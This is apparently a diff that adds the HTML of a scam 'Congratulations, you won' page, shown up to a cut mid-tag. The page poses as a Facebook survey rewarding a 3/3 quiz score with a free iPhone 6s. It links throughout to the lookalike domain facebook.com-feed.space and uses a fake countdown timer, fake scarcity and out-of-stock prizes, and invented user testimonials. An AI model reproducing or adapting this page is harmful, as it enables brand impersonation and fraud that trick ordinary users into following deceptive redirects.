+    <!--<a href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"-->
+    <!--class="item"><span></span></a>-->
+    <!--<a href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"-->
+    <!--class="item"><span></span></a>-->
+    <!--<a href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"-->
+    <!--class="item"><span></span></a>-->
+    <!--<a href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"-->
+    <!--class="item"><span></span></a>-->
+    <!--</div>-->
+    <div class="container">
+        <div class="contestwrap">
+            <div class="toptext" style="font-size:14px;">
+                <center>
+                    <table>
+                        <tbody>
+                        <tr>
+                            <th><b><font color="#3c599b">Congraduations, You got 3/3 questions right!</font></b></th>
+                        </tr>
+                        <tr>
+                            <td align="center">
+                                <font size="2px" color="#9fa2a6">
+                                    <script language="Javascript">
+                                        document.write(date("l, d F, Y"));
+                                    </script>
+                                    
+                                </font>
+                            </td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </center>
+                <p>Every
+                    <script language="Javascript">document.write(date("l"));</script>
+                    ,
+                    we offer an exclusive prize from our sponsors as our thank you for taking part in this Facebook fan survey.<strong><br><br>
+                       You may select any of these exclusive prizes below; please note there's limited availability </strong>
+                    <br>
+                    <br>
+                    <strong>Note:</strong>Act fast, as these prizes may be taken down any moment!
+                    <br>
+                </p>
+            </div>
+            <script type="text/javascript">
+                setInterval('countdown()', 1000);
+
+                function countdown() {
+                    var mins = parseInt(document.getElementById("mins").innerHTML);
+                    var secs = parseInt(document.getElementById("hsecs").innerHTML);
+                    if (mins != 0 && secs == 0) {
+                        nmins = mins - 1;
+                        nsecs = 59;
+                    } else if (mins != 0 || secs != 0) {
+                        nmins = mins;
+                        nsecs = secs - 1;
+                    } else if (mins == 0 && secs == 0) {
+                        nmins = mins;
+                        nsecs = secs;
+                    }
+                    document.getElementById("mins").innerHTML = nmins;
+                    document.getElementById("hsecs").innerHTML = nsecs;
+                    if (nsecs < 10) nsecs = "0" + nsecs;
+                    //document.getElementById("secs").innerHTML = nsecs;
+                }
+            </script>
+            <div class="clear"></div>
+        </div>
+        <div class="select">You have <font color="red"><b><span id="mins">NaN</span> minutes and <span
+                id="hsecs">NaN</span>
+            seconds</b></font> to select a prize below or your spot will be given to someone else
+        </div>
+        <div class="content">
+            <div class="item itemA">
+                <div class="left">
+                    <a href="http://free.stayforfit.com/click" onclick="exit_a1()"><img class="img"
+                                                                                       src="./Congrats!_RunNan_files/iphones.png"></a>
+
+                    <div class="clear"></div>
+                    <div class="lightblue2">2 Lagi Yang Tinggal</div>
+                </div>
+                <div class="right">
+                    <div class="track"><a href="http://free.stayforfit.com/click">Apple iPhone 6s</a></div>
+                    <div class="secondary">
+                        <div class="rating">4.7", Space Gray, 64GB</div>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating"><span class="lightblue">Regular Price: $949</span>
+                        </div>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating"><span class="lightblue">Your Price: <font color="green">
+                            $0.00</font></span></div>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating"></div>
+                    </div>
+                    <div class="clear"></div>
+                    <div><a target="_top" class="button1" style="background-color: #46629E"
+                            href="http://free.stayforfit.com/click"
+                            onclick="exit_a1()">SELECT</a></div>
+                </div>
+                <div class="clear"></div>
+            </div>
+            <div class="item">
+                <div class="left">
+                    <a href="" onclick="alert(&#39;\n Please select another gift.&#39;)"><img class="img"
+                                                                                          src="./Congrats!_RunNan_files/ipad.png"></a>
+
+                    <div class="clear"></div>
+                    <div class="lightblue2">0 Lagi Yang Tinggal</div>
+                </div>
+                <div class="right">
+                    <div class="track"><a href="" onclick="alert(&#39;\n Please select another gift.&#39;)">Apple iPad Air
+                        2</a>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating">Retina, WiFi, 64GB</div>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating"><span class="lightblue">Regular Price: $449</span>
+                        </div>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating"><span class="lightblue">Your Price: <font color="green">
+                            $0.00</font></span></div>
+                    </div>
+                    <div class="clear"></div>
+                    <div><a class="button1" onclick="alert(&#39;\nPlease select another gift.&#39;)">OUT OF STOCK</a>
+                    </div>
+                </div>
+                <div class="clear"></div>
+            </div>
+            <div class="item itemC">
+                <div class="left">
+                    <a href="" onclick="alert(&#39;\nPlease select another gift.&#39;)"><img class="img"
+                                                                                          src="./Congrats!_RunNan_files/macbookpro.jpg"></a>
+
+                    <div class="clear"></div>
+                    <div class="lightblue2">
+                        0 Lagi Yang Tinggal
+                    </div>
+                </div>
+                <div class="right">
+                    <div class="track"><a href="" onclick="alert(&#39;r\nSila pilih hadiah lain.&#39;)">Apple Macbook
+                        Pro</a></div>
+                    <div class="secondary">
+                        <div class="rating">15.4", Retina Display, 2.2GHz, 256GB</div>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating"><span class="lightblue">Regular Price: $1000 </span>
+                        </div>
+                    </div>
+                    <div class="secondary">
+                        <div class="rating"><span class="lightblue">Your Price: <font color="green">
+                            $0.00</font></span></div>
+                    </div>
+                    <div class="secondary">
+                    </div>
+                    <div class="clear"></div>
+                    <div><a class="button1" onclick="alert(&#39;r\nSila pilih hadiah lain.&#39;)">OUT OF STOCK</a>
+                    </div>
+                </div>
+                <div class="clear"></div>
+            </div>
+        </div>
+
+        <div class="comments">
+            <div class="like-line-menu">
+
+                <div class="like-line-menu__item"><a
+                        href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#">Comment</a>
+                </div>
+                <div class="like-line-menu__item"><a
+                        href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#">Like</a>
+                </div>
+            </div>
+            <div class="like-count-line">
+                <b id="user" style="color: rgb(59, 89, 152);">1732</b> like this.
+            </div>
+            <div class="send-comments">
+                <form action="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                      method="post">
+                    <div class="send-comments--input_wrapper">
+                        <div class="send-comments--input_inner">
+                        <textarea name="send-comments_text" placeholder="Tuliskan komen..." id="send-comments_text"
+                                  cols="30" rows="10" class="send-comments--input"></textarea>
+                        </div>
+                    </div>
+                    <div class="send-comments--submit_wrapper">
+                        <input type="submit" value="Post" class="send-comments--submit" id="send-comments_submit">
+                    </div>
+                    <div class="clear"></div>
+                </form>
+            </div>
+
+            <center>
+                <font face="arial">
+                    <table width="100%" cellspacing="0" cellpadding="4" border="0"
+                           style="padding-top: 10px; font-size: 13px;">
+                        <tbody id="comments_list">
+
+                        <tr class="" id="com_1">
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/1.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                    Amelia Abd Latif
+                                </div>
+                                <div style="padding-top: 5px;">Mine just came in the mail today! Thank you Facebook for the new iPhone 6s!
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: inline-block;"><i class="ico"></i><span
+                                            class="like_count">1</span>
+                                    </div>
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">Just Now</div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr id="c1">
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        <tr id="com_2">
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/2.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                    Yuncheng Li
+                                </div>
+                                <div style="padding-top: 5px;">I thought it was a scam, but since they didn't ask for a credit card I filled it out anyway. I was shocked when I received a new iPad mini a few days ago!
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: inline-block;"><i class="ico"></i><span
+                                            class="like_count">34</span></div>
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">
+                                        at 8:13 am
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr id="c2">
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        <tr id="com_3">
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/3.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                    Joseph Nam
+                                </div>
+                                <div style="padding-top: 5px;">I am a hug fan of Game of Thrones, and took the test for fun scoring 3/3. When I got to the end, they offered me a thank you prize. I couldn't believe when I got a call asking me come to the airport to claim my voucher for a plane ticket.
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: inline-block;"><i class="ico"></i><span
+                                            class="like_count">22</span></div>
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">
+                                        <script type="text/javascript">
+                                            document.write(date("d F"));
+                                        </script>
+                                         at 4:21 pm
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr id="c3">
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        <tr id="com_4">
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/4.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                    Jeffery Pope
+                                </div>
+                                <div style="padding-top: 5px;">Cool! Free iPhone, holy shit! I have tried to register a second time, but was invoked. Asked for another T-shirt. Have 2 T-shirts now.
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: inline-block;"><i class="ico"></i><span
+                                            class="like_count">18</span></div>
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">
+                                        <script type="text/javascript">
+                                            document.write(date("d F"));
+                                        </script>
+                                       at 3:33 am
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr id="c4">
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        <tr id="com_5">
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/5.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                Ryan Jennings
+                                </div>
+                                <div style="padding-top: 5px;">Was not sure if it was true, but just got my iPhone today :)
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: inline-block;"><i class="ico"></i><span
+                                            class="like_count">16</span></div>
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="comment_replay">Reply</a></div>
+                                    <div class="comments__item__meta__item">
+                                        <script type="text/javascript">
+                                            var mydate = new Date()
+                                            mydate.setDate(mydate.getDate() - 2);
+                                            document.write(date("d F", mydate));
+                                        </script>
+                                     at 9:02 am
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr id="c5">
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="50" valign="top" align="right"><img src="./Congrats!_RunNan_files/6.jpg"></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight: bold; color:#3b5998;">
+                                    Rufus Maldonado
+                                </div>
+                                <div style="padding-top: 5px;">Thought it was a joke. But I got my iPhone today.
+                                </div>
+
+                                <div class="comments__item__meta">
+                                    <div class="comments__item__meta__item"><a
+                                            href="http://facebook.com-feed.space/r/l/e9e4850e4836df7c15686d01ac4b83e1/?entrypop=1&amp;exitpop=1&amp;lang=ms&amp;cc=MY&amp;target=2&amp;cn=iphone6s_hard_currency&amp;model=Xperia%20Z2&amp;brand=Sony&amp;voluumdata=vid..00000003-9da2-4095-8000-000000000000__vpid..c3334800-c46f-11e5-81cb-f3fe1976f2c0__caid..5d1b8128-ff40-4026-b7f0-f44f5585bfc9__rt..D__lid..a863aba0-26c0-4e8e-ae6b-89fdd962ce4b__oid1..ccc3b1e2-4f0b-422f-bf2b-b2731bc2cc96__var1..111688__var2..Music__var3..MY__var4..Android__var5..111688%5C_%5C%5C_%5CMusic%5C_%5C%5C_%5CMY%5C_%5C%5C_%5CAndroid__var6..ar03__rd..popcash%5C.%5Cnet__aid..__sid..&amp;siteid=111688&amp;pubid=Music&amp;os=Android&amp;tr_data=111688__Music__MY__Android&amp;src=ar03&amp;ln=iphone6s_hard_currency#"
+                                            class="action_like" data-text-dislike="Tak Like">Like</a></div>
+                                    <div class="comments__item__meta__item comments__item__meta__item__like_count"
+                                         style="display: inline-block;"><i class="ico"></i><span
+                                            class="like_count">5</span>
+                                    </div>
+                                    <div class="comments__item__meta__item"><a
